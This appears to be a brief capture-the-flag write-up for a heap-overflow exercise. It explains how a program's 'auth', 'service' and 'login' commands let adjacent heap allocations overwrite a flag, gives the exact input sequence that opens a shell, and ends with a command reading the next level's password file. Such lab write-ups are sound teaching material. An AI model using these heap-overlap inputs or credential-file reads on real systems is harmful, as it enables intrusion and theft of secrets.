do while(true) loop that checks what we write

"auth *" -> auth gets malloc and sets its value to the rest
of the input (specified here with *)
"service*", service gets strdup (same thing with *)
"reset" frees auth
"login" -> auth_address + 0x20 == 0 -> writes "Password:\n"
        -> auth_address + 0x20 != 0 -> runs "/bin/sh"

each malloc call sets memory to last malloc + 0x10 bytes
so we simply need to do "auth ", "service0123456789abcdef" and "login"

"auth " to create auth_address
"service0123456789abcdef" to put 'f' at auth_address + 0x20
"login" to get inside the shell

we can cat /home/user/level9/.pass
